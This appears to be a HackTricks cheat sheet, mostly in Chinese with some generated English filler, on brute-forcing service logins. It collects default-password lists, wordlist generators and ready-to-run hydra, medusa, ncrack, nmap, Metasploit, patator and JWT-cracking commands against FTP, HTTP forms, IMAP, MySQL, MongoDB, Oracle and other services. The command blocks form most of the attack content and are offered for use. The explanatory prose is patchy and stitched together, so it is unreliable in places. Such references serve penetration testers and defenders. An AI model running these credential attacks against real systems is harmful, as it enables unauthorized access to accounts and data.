# 暴力破解 - 速查表

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## 默认凭据

在谷歌中搜索正在使用的技术的默认凭据，或者尝试以下链接：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **创建自己的字典**

尽可能多地了解目标，并生成自定义字典。可能有帮助的工具：

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It is particularly useful for password cracking and brute force attacks. Cewl works by analyzing the given source and extracting words based on various criteria such as word length, frequency, and relevance.

To use Cewl, you need to provide it with a target website or a document. It will then crawl the source and extract words from it. By default, Cewl only considers words that are at least four characters long. However, you can customize this setting to include shorter words as well.

Cewl also allows you to specify the minimum frequency of words to be included in the wordlist. This is useful for filtering out common words that are unlikely to be used as passwords. Additionally, you can provide Cewl with a custom dictionary to exclude certain words from the generated wordlist.

Once Cewl has finished analyzing the source, it will output the generated wordlist in a text file. This wordlist can then be used with password cracking tools like John the Ripper or Hashcat to perform brute force attacks.

Overall, Cewl is a powerful tool for generating custom wordlists that can greatly enhance the effectiveness of brute force attacks. By tailoring the wordlist to the target, attackers can increase their chances of successfully cracking passwords.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

根据你对受害者的了解（姓名、日期等）生成密码
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister是一个字典生成工具，允许您提供一组单词，从给定的单词中创建多个变体，从而创建一个针对特定目标的独特和理想的字典。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 字典列表

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 服务

按服务名称按字母顺序排列。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) 是一种用于在 Apache Tomcat 和 Apache HTTP Server 之间进行通信的协议。它允许将请求从 HTTP Server 转发到 Tomcat 服务器，以便处理动态内容。然而，由于其设计上的一些弱点，AJP 可能会成为黑客进行攻击的目标。

#### 强制攻击

强制攻击是一种基于暴力破解的攻击方法，黑客通过尝试所有可能的组合来破解密码或密钥。对于 AJP，黑客可以使用强制攻击来尝试猜测有效的用户名和密码组合，以获取对服务器的未授权访问。

#### 防御措施

为了保护 AJP 协议免受强制攻击，可以采取以下防御措施：

1. 使用强密码：确保使用足够复杂和难以猜测的密码，以增加破解的难度。
2. 锁定账户：在一定的登录尝试失败次数后，自动锁定账户，以防止黑客继续尝试破解密码。
3. 使用多因素身份验证：通过使用多个身份验证因素，如密码和验证码，增加黑客破解密码的难度。
4. 监控登录活动：定期监控登录活动，及时发现异常登录尝试，并采取相应的措施。

通过采取这些防御措施，可以有效地保护 AJP 协议免受强制攻击。
```bash
nmap --script ajp-brute -p 8009 <IP>
```
# Cassandra

Cassandra 是一个高度可扩展的分布式数据库系统，它被设计用于处理大规模数据集。它采用了分布式架构，可以在多个节点上存储和处理数据。Cassandra 提供了高可用性和容错性，可以自动处理节点故障，并且具有线性可扩展性。

## 基本原理

Cassandra 使用了一种称为分区一致性哈希（Partition Consistent Hashing）的算法来分布数据。这种算法将数据分成多个分区，并将每个分区分配给不同的节点。每个节点负责管理自己分区的数据，并与其他节点进行通信以保持数据的一致性。

Cassandra 还使用了一种称为副本复制（Replication）的机制来提供高可用性和容错性。每个数据分区都有多个副本，这些副本分布在不同的节点上。当一个节点发生故障时，Cassandra 可以自动将副本切换到其他可用的节点上，以确保数据的可用性。

## 攻击方法

Cassandra 可能受到以下攻击方法的威胁：

1. **暴力破解（Brute Force）**：攻击者可以尝试使用暴力破解方法来猜测有效的凭据（用户名和密码）以获取对 Cassandra 数据库的访问权限。为了防止这种攻击，建议使用强密码，并限制登录尝试次数。

2. **拒绝服务（Denial of Service，DoS）**：攻击者可以通过发送大量请求或恶意请求来占用 Cassandra 资源，导致系统无法正常工作。为了防止这种攻击，建议配置适当的资源限制和访问控制策略。

3. **数据泄露（Data Leakage）**：攻击者可能通过未经授权的方式获取敏感数据，如用户凭据、个人信息等。为了防止数据泄露，建议加密敏感数据，并实施访问控制和审计机制。

## 安全措施

为了保护 Cassandra 数据库免受攻击，可以采取以下安全措施：

1. **强密码策略**：使用强密码，并定期更改密码，以防止暴力破解攻击。

2. **访问控制**：限制对 Cassandra 数据库的访问权限，并仅授权给需要访问的用户。

3. **网络安全**：使用防火墙和网络隔离等措施来保护 Cassandra 节点免受未经授权的访问。

4. **数据加密**：对敏感数据进行加密，以防止数据泄露。

5. **日志和审计**：启用日志记录和审计功能，以便及时检测和响应安全事件。

请注意，这些安全措施只是一些基本的建议，具体的安全配置应根据实际情况进行调整和实施。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB is a NoSQL database that uses JSON to store data. It is known for its distributed architecture and ability to handle large amounts of data. CouchDB provides a RESTful API for accessing and manipulating data, making it easy to integrate with web applications.

#### Brute Force Attacks

Brute force attacks are a common method used to gain unauthorized access to systems or accounts. In the context of CouchDB, a brute force attack involves systematically trying different combinations of usernames and passwords until the correct credentials are found.

#### Protecting Against Brute Force Attacks

To protect against brute force attacks on CouchDB, it is important to implement strong security measures. Here are some recommended strategies:

1. **Use Strong Passwords**: Ensure that all user accounts have strong, unique passwords that are not easily guessable.

2. **Implement Account Lockouts**: Set up a mechanism that locks user accounts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily disabling accounts that are being targeted.

3. **Enable CAPTCHA**: Implement CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart) to prevent automated scripts from attempting brute force attacks.

4. **Monitor Login Attempts**: Regularly monitor and analyze login attempts to identify any suspicious activity. This can help detect and mitigate brute force attacks in real-time.

5. **Limit Access**: Restrict access to CouchDB by allowing only trusted IP addresses or networks to connect to the database. This can help prevent unauthorized access attempts.

By implementing these security measures, you can significantly reduce the risk of successful brute force attacks on your CouchDB instance.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry is a service that allows you to store and distribute Docker images. It is a central repository where you can upload and download Docker images. Docker Registry can be either public or private, depending on your needs.

#### Brute Force Attack

A brute force attack is a method used by hackers to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords or encryption keys until the correct one is found. This attack relies on the assumption that the password or encryption key is weak and can be easily guessed.

#### Brute Forcing Docker Registry

Brute forcing a Docker Registry involves attempting to gain unauthorized access to the registry by systematically trying different combinations of usernames and passwords. This can be done using automated tools that can generate and test a large number of combinations in a short amount of time.

#### Mitigating Brute Force Attacks

To mitigate brute force attacks on your Docker Registry, you can implement the following security measures:

1. Use strong and complex passwords: Ensure that your passwords are long, contain a combination of uppercase and lowercase letters, numbers, and special characters.

2. Implement account lockout policies: Set up a mechanism that locks user accounts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily disabling the account.

3. Enable multi-factor authentication (MFA): Implement MFA to add an extra layer of security to your Docker Registry. This requires users to provide additional verification, such as a code sent to their mobile device, in addition to their username and password.

4. Monitor and analyze logs: Regularly monitor and analyze the logs of your Docker Registry to detect any suspicious login attempts or patterns that may indicate a brute force attack. Implementing a log management system can help automate this process.

By implementing these security measures, you can significantly reduce the risk of a successful brute force attack on your Docker Registry.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It provides a scalable solution for storing, searching, and analyzing large volumes of data in near real-time.

## Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to Elasticsearch instances. In a brute force attack, the hacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

### Protecting Against Brute Force Attacks

To protect against brute force attacks, it is important to implement strong security measures. Here are some best practices to follow:

1. **Use strong passwords**: Ensure that all Elasticsearch user accounts have strong, unique passwords that are not easily guessable.

2. **Implement account lockouts**: Set up account lockouts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily locking out the attacker.

3. **Enable multi-factor authentication**: Implement multi-factor authentication to add an extra layer of security. This can help protect against brute force attacks even if the attacker manages to obtain the correct username and password.

4. **Monitor for suspicious activity**: Regularly monitor Elasticsearch logs and network traffic for any signs of brute force attacks. Implementing intrusion detection systems can help detect and alert on such activities.

5. **Limit access**: Restrict access to Elasticsearch instances to only authorized users and IP addresses. This can help minimize the risk of brute force attacks.

By following these best practices, you can significantly reduce the risk of brute force attacks on your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（文件传输协议）是一种用于在计算机之间传输文件的标准网络协议。它允许用户通过网络连接到远程计算机，并在本地计算机和远程计算机之间传输文件。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在FTP中，暴力破解是指使用自动化工具或脚本来尝试不同的用户名和密码组合，直到找到正确的凭据为止。

暴力破解可以通过以下步骤进行：

1. 枚举用户名：攻击者使用字典或生成器来生成可能的用户名列表。
2. 枚举密码：攻击者使用字典或生成器来生成可能的密码列表。
3. 尝试登录：攻击者使用生成的用户名和密码组合尝试登录到FTP服务器。
4. 检查结果：如果登录成功，则攻击者获得了有效的凭据，并可以访问FTP服务器上的文件。

为了防止暴力破解攻击，FTP服务器通常会实施以下安全措施：

- 强密码策略：要求用户使用复杂的密码，并定期更改密码。
- 登录尝试限制：限制每个用户的登录尝试次数，以防止暴力破解。
- 账户锁定：在多次失败的登录尝试后，锁定用户账户一段时间，以防止进一步的攻击。

尽管FTP是一种常见的文件传输协议，但由于其安全性较低，现在已经有更安全的替代方案可供选择，如SFTP（安全文件传输协议）和FTPS（FTP安全）。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTP通用暴力破解

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP基本身份验证
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - Post表单

Brute forcing a login form is a common technique used to gain unauthorized access to a web application. In this method, an attacker systematically tries different combinations of usernames and passwords until a successful login is achieved.

To perform a brute force attack on an HTTP POST form, follow these steps:

1. Identify the login form: Inspect the HTML source code of the login page to locate the form element that contains the username and password fields.

2. Prepare a wordlist: Create a text file containing a list of possible usernames and passwords. This wordlist will be used by the brute force tool to systematically try different combinations.

3. Use a brute force tool: There are various tools available for performing brute force attacks on web forms. These tools automate the process of sending HTTP POST requests with different username and password combinations. Some popular tools include Hydra, Medusa, and Burp Suite.

4. Configure the brute force tool: Set the target URL to the login page of the web application. Specify the username and password fields in the form data of the HTTP POST request. Configure the tool to use the wordlist file created in step 2.

5. Start the brute force attack: Run the brute force tool and let it systematically try different combinations of usernames and passwords. The tool will send HTTP POST requests to the login form, checking for successful logins.

6. Analyze the results: Once the brute force attack is complete, analyze the results to identify any successful login attempts. The tool may provide a report or log file indicating the usernames and passwords that were successfully guessed.

It is important to note that brute forcing a login form is a time-consuming process and may be detected by security mechanisms such as account lockouts or rate limiting. Additionally, brute forcing is an illegal activity unless performed with proper authorization for penetration testing purposes. Always ensure you have the necessary permissions and legal authorization before attempting any brute force attacks.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
对于http**s**，你需要将 "http-post-form" 改为 "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP（Internet Mail Access Protocol）是一种用于接收电子邮件的协议。它允许用户通过电子邮件客户端从邮件服务器上下载邮件。IMAP协议提供了许多功能，如在服务器上管理邮件夹、搜索邮件和同步多个设备上的邮件等。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在IMAP中，暴力破解可以用于尝试破解用户的登录凭据，以获取对其电子邮件的访问权限。

暴力破解通常涉及使用自动化工具来尝试大量的可能密码组合，直到找到正确的密码为止。攻击者可以使用常见的密码字典、暴力破解软件或自定义脚本来执行这种攻击。

为了防止暴力破解攻击，用户应该选择强密码，并启用账户锁定功能，以限制登录尝试次数。此外，系统管理员可以使用入侵检测系统（IDS）或入侵防御系统（IPS）来监视和阻止暴力破解攻击。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC（Internet Relay Chat）是一种实时的互联网聊天协议。它允许用户通过IRC客户端在各种主题的聊天室中进行交流。IRC是一种非常古老的协议，但仍然被广泛使用。

### 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未授权访问。这种方法通常用于攻击弱密码保护的系统。暴力破解可以使用各种工具和脚本来自动化执行。

### 暴力破解IRC

暴力破解IRC是一种尝试破解IRC账户密码的攻击方法。攻击者使用暴力破解工具来尝试所有可能的密码组合，直到找到正确的密码为止。这种攻击方法通常需要大量的计算资源和时间，因为IRC服务器通常会实施一些安全措施来防止暴力破解攻击。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI（Internet Small Computer System Interface）是一种用于在IP网络上传输SCSI命令的协议。它允许计算机通过网络连接到远程存储设备，就像它们直接连接到本地存储设备一样。iSCSI使用TCP/IP协议来提供远程存储访问，并通过将SCSI命令封装在IP数据包中来实现数据传输。

iSCSI的工作原理是通过在本地计算机和远程存储设备之间建立逻辑连接。本地计算机将SCSI命令发送到远程存储设备，远程存储设备执行这些命令并将结果返回给本地计算机。这种远程存储访问的方式使得计算机可以利用远程存储设备的容量和性能，而无需直接连接到它们。

iSCSI的一种常见用途是在虚拟化环境中使用。通过将虚拟机的磁盘映像存储在远程存储设备上，可以实现虚拟机的迁移和高可用性。此外，iSCSI还可以用于备份和存档，以及在分布式存储系统中实现数据共享。

尽管iSCSI提供了方便的远程存储访问，但它也存在一些安全风险。攻击者可以使用暴力破解等技术来尝试猜测iSCSI的凭据，并获取对远程存储设备的未授权访问。因此，在配置iSCSI时，应采取适当的安全措施，如使用强密码、限制访问和加密数据传输，以保护远程存储设备的安全。
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token（JWT）是一种用于在网络应用之间传递信息的开放标准（RFC 7519）。它通过使用数字签名或加密来验证信息的可靠性和完整性。JWT由三部分组成：头部（Header）、载荷（Payload）和签名（Signature）。

#### 头部（Header）

头部通常由两部分组成：令牌的类型（即JWT）和所使用的签名算法。常见的签名算法包括HMAC SHA256和RSA。

#### 载荷（Payload）

载荷包含了要传输的信息，可以包括用户的身份信息、权限等。载荷可以是公开的，但不建议在其中存储敏感信息。

#### 签名（Signature）

签名用于验证消息的完整性和真实性。它由头部、载荷和一个密钥组成。使用密钥对头部和载荷进行签名，以确保在传输过程中没有被篡改。

#### 使用场景

JWT常用于身份验证和授权方面。当用户成功登录后，服务器会生成一个JWT并将其返回给客户端。客户端在后续的请求中将JWT作为身份验证凭证发送给服务器。服务器通过验证JWT的签名来确认用户的身份和权限。

#### JWT的优势

- 简洁：由于JWT是基于JSON格式的，因此它具有良好的可读性和易于解析的特点。
- 自包含：JWT包含了所有必要的信息，无需依赖服务器的会话存储。
- 安全性：JWT使用数字签名或加密来验证和保护信息的完整性。

#### JWT的缺点

- 无法撤销：一旦JWT签发后，无法撤销或更改其内容。如果需要撤销访问权限，必须等待JWT的过期时间到期。
- 增加网络负载：由于JWT需要在每个请求中传输，因此会增加网络负载。

#### 总结

JWT是一种用于在网络应用之间传递信息的开放标准。它具有简洁、自包含和安全性的优势，但也存在无法撤销和增加网络负载的缺点。在身份验证和授权方面，JWT被广泛应用于各种场景中。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP（轻量级目录访问协议）是一种用于访问和维护分布式目录服务的协议。它允许客户端通过网络连接到目录服务器，并执行各种操作，如搜索、添加、修改和删除目录条目。

LDAP是一种常见的协议，用于管理用户和组织的身份验证和授权信息。它通常用于企业环境中的身份验证和访问控制，以及电子邮件和其他应用程序中的用户帐户管理。

LDAP协议的一个重要特点是它支持基于用户名和密码的身份验证。这使得攻击者可以使用暴力破解技术来尝试猜测用户的密码。暴力破解是一种通过尝试所有可能的密码组合来破解密码的方法。

攻击者可以使用各种工具和技术来进行LDAP暴力破解攻击。这些工具可以自动化密码猜测过程，并尝试使用不同的用户名和密码组合来登录目标LDAP服务器。

为了防止LDAP暴力破解攻击，目标LDAP服务器应该实施一些安全措施，如限制登录尝试次数、使用强密码策略和启用账户锁定功能。此外，使用多因素身份验证可以提供额外的安全层级，以防止未经授权的访问。

作为安全专业人员，我们应该了解LDAP暴力破解攻击的原理和方法，并采取适当的措施来保护目标系统免受此类攻击的影响。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）是一种轻量级的消息传输协议，通常用于物联网设备之间的通信。它基于发布-订阅模式，允许设备通过中间代理（broker）进行消息的发布和订阅。

MQTT协议使用TCP/IP协议栈进行通信，并具有低带宽和低功耗的特点。它适用于网络带宽有限的环境，如传感器网络和移动设备。

MQTT协议的安全性取决于所使用的认证和加密机制。在实施MQTT时，应考虑使用安全的认证方式，如用户名和密码，以及使用TLS/SSL进行数据加密。

攻击者可以利用MQTT协议的弱点进行攻击，如使用暴力破解（brute force）方法尝试猜解用户名和密码，或者通过中间人攻击（man-in-the-middle）窃取传输的数据。

为了保护MQTT通信的安全性，应采取以下措施：

- 使用强密码和用户名，避免使用默认凭据；
- 启用TLS/SSL加密，确保数据在传输过程中的机密性；
- 限制连接到MQTT代理的设备数量，以防止资源耗尽和拒绝服务攻击；
- 定期更新MQTT代理和设备的软件版本，以修复已知的安全漏洞；
- 监控MQTT通信，及时检测异常活动和潜在的攻击。

通过采取这些措施，可以增强MQTT通信的安全性，保护物联网设备和数据的机密性和完整性。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo是一种流行的NoSQL数据库，常用于存储大量非结构化数据。由于其广泛的应用，Mongo成为黑客攻击的目标之一。在渗透测试中，使用暴力破解是一种常见的攻击方法，用于尝试破解Mongo数据库的凭据。

暴力破解是一种通过尝试所有可能的组合来破解密码的方法。对于Mongo数据库，黑客可以使用暴力破解工具来尝试不同的用户名和密码组合，直到找到正确的凭据。这种攻击方法的成功取决于密码的复杂性和强度。

为了保护Mongo数据库免受暴力破解攻击，以下是一些建议的安全措施：

1. 使用强密码：确保Mongo数据库的凭据使用强密码，包括大写字母、小写字母、数字和特殊字符的组合。避免使用常见的密码，如"password"或"123456"。

2. 实施访问控制：限制对Mongo数据库的访问权限，只允许授权用户访问。使用角色和权限来管理用户的访问级别，并定期审查和更新访问控制策略。

3. 启用身份验证：确保Mongo数据库启用了身份验证功能，要求用户在访问数据库之前进行身份验证。这可以防止未经授权的访问。

4. 监控登录尝试：监控Mongo数据库的登录尝试，包括失败的尝试。及时检测到暴力破解攻击，并采取相应的措施，如锁定账户或增加登录尝试的延迟。

5. 更新和维护：定期更新Mongo数据库的软件和补丁，以修复已知的安全漏洞。同时，定期备份数据库，以防止数据丢失。

通过采取这些安全措施，可以增强Mongo数据库的安全性，减少暴力破解攻击的风险。然而，黑客的攻击技术不断演变，因此保持警惕并及时更新安全措施至关重要。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL是一种流行的关系型数据库管理系统，广泛用于Web应用程序和其他数据驱动的应用程序中。MySQL使用SQL语言进行查询和管理数据。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在MySQL中，暴力破解可以用于尝试猜测数据库用户的密码，以获取未经授权的访问权限。

暴力破解通常涉及使用自动化工具或脚本来尝试大量的可能密码组合，直到找到正确的密码为止。攻击者可以使用常见的密码列表、字典文件或生成的密码组合来进行暴力破解。

为了防止暴力破解攻击，MySQL管理员可以采取以下措施：

- 使用强密码策略，要求用户设置复杂的密码。
- 启用账户锁定功能，限制登录尝试次数。
- 监控登录活动，检测异常登录尝试。
- 使用防火墙或网络入侵检测系统来阻止暴力破解攻击。

尽管暴力破解是一种有效的攻击技术，但它通常需要大量时间和计算资源。因此，采取适当的安全措施可以有效地防止暴力破解攻击。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# Brute Force

Brute force is a common method used in penetration testing to crack passwords or gain unauthorized access to systems. It involves systematically trying every possible combination of characters until the correct password is found.

## Brute Force Attacks on Oracle SQL

Brute force attacks can be used to crack Oracle SQL passwords by repeatedly attempting different password combinations until the correct one is discovered. This method can be effective if the password is weak or easily guessable.

## Tools for Brute Force Attacks on Oracle SQL

There are several tools available for conducting brute force attacks on Oracle SQL. Some popular ones include:

- **Hydra**: A powerful command-line tool that supports multiple protocols, including Oracle SQL. It can be used to automate the process of trying different password combinations.

- **Metasploit**: A widely-used framework for penetration testing that includes modules for conducting brute force attacks on various systems, including Oracle SQL.

- **Ncrack**: A high-speed network authentication cracking tool that supports Oracle SQL. It can be used to quickly try different password combinations.

## Best Practices to Prevent Brute Force Attacks

To protect against brute force attacks on Oracle SQL, it is important to follow these best practices:

- **Use strong passwords**: Choose passwords that are long, complex, and difficult to guess. Avoid using common words or easily guessable patterns.

- **Implement account lockouts**: Set up account lockout policies that temporarily lock user accounts after a certain number of failed login attempts. This can help prevent brute force attacks.

- **Monitor login attempts**: Regularly review logs and monitor for any suspicious login attempts. This can help identify and mitigate brute force attacks.

- **Enable two-factor authentication**: Implement two-factor authentication for Oracle SQL to add an extra layer of security. This can help prevent unauthorized access even if the password is compromised.

By following these best practices, you can significantly reduce the risk of brute force attacks on Oracle SQL.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

